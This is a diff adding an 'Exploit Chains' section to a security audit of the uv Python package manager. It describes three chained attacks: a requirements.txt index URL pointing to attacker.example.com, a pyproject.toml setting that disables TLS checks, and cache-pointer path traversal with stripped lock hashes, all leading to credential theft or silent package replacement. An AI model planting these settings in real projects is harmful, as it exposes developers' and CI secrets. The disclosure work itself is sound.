@@ -11,7 +11,9 @@
 ## Executive Summary
 
 This audit identified **fifteen independently verified vulnerabilities** in uv, plus two
-defense-in-depth gaps. The most critical findings are:
+defense-in-depth gaps. Additionally, we demonstrate **three exploit chains** that combine
+vulnerabilities for end-to-end critical attacks (supply chain credential theft, HTTPS credential
+exfiltration, silent package replacement). The most critical findings are:
 
 1. **UV_PYTHON_DOWNLOADS_JSON_URL RCE (CRITICAL):** The `UV_PYTHON_DOWNLOADS_JSON_URL` environment
    variable accepts plain HTTP URLs and the SHA256 hash field is optional. An attacker who controls
@@ -942,6 +944,86 @@ None in practice. ZIP CRC32 is validated during extraction. This matches pip's b
 
 **Recommendation:**  
 None required. This is consistent with the Python packaging ecosystem.
+
+---
+
+## Exploit Chains
+
+The following exploit chains demonstrate that individual vulnerabilities can be combined for
+end-to-end critical attacks. These chains prove the findings are not hypothetical — they represent
+real-world attack paths with severe consequences.
+
+### CHAIN-001: Supply Chain Credential Exfiltration (CRITICAL)
+
+**Chained Vulnerabilities:** UV-2026-011 + UV-2026-001
+
+**Attack Scenario:**
+
+1. Attacker supplies a `requirements.txt` containing
+   `--index-url http://attacker.example.com/simple/` via PR, shared CI config, or compromised
+   upstream repository
+2. Victim's CI pipeline runs `uv pip install -r requirements.txt`
+3. UV-2026-011 causes ALL package resolution to redirect to attacker's server
+4. Attacker serves a malicious sdist for a trusted package (e.g., `requests`)
+5. UV-2026-001: uv passes the full environment to the build subprocess
+6. `setup.py` exfiltrates `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `CI_DEPLOY_KEY` to attacker
+
+**Impact:** A single line in `requirements.txt` achieves full credential theft from any developer or
+CI pipeline.
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploit_chains/chain_01_supply_chain_rce/run_chain.sh
+```
+
+### CHAIN-002: HTTPS Credential Exfiltration via TLS Bypass (CRITICAL)
+
+**Chained Vulnerabilities:** UV-2026-007 + UV-2026-001
+
+**Attack Scenario:**
+
+1. Attacker creates a project with `pyproject.toml` containing
+   `allow-insecure-host = ["attacker.example.com:443"]`
+2. Developer clones the project, runs `uv pip install` with `--index-url` pointing to attacker
+3. UV-2026-007: `pyproject.toml` silently disables TLS certificate verification for attacker's
+   server
+4. Attacker's HTTPS server (with self-signed cert) responds — normally this would cause
+   `UnknownIssuer` TLS error, but pyproject.toml bypasses verification
+5. UV-2026-001: Malicious build backend exfiltrates `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`
+
+**Impact:** Invisible HTTPS credential exfiltration — no TLS errors, no warnings. Attacker
+compromises any developer who clones a malicious project.
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploit_chains/chain_02_tls_selfupdate_rce/run_chain.sh
+```
+
+### CHAIN-003: Silent Package Replacement via Cache Poisoning (CRITICAL)
+
+**Chained Vulnerabilities:** UV-2026-016 + UV-2026-009
+
+**Attack Scenario:**
+
+1. Attacker has write access to a shared CI/CD cache (NFS mount, Docker volume, overlay filesystem)
+2. Attacker places a malicious wheel at an arbitrary path outside the cache
+3. Attacker writes a `.rev` pointer with ArchiveId containing `../..` sequences
+4. UV-2026-016: `ArchiveId::from_str()` accepts any string without validation — pointer redirects
+   cache lookup to attacker's wheel path
+5. Attacker strips hashes from the project's `uv.lock`
+6. UV-2026-009: entries with no hash field → `HashPolicy::None` → no verification
+7. Victim runs `uv sync` — malicious package installed silently with no errors or warnings
+
+**Impact:** In shared CI environments, an attacker with cache write access can silently replace any
+cached package with malicious code, bypassing all hash checks.
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploit_chains/chain_03_cache_poison_silent_replace/run_chain.sh
+```
 
 ---
 
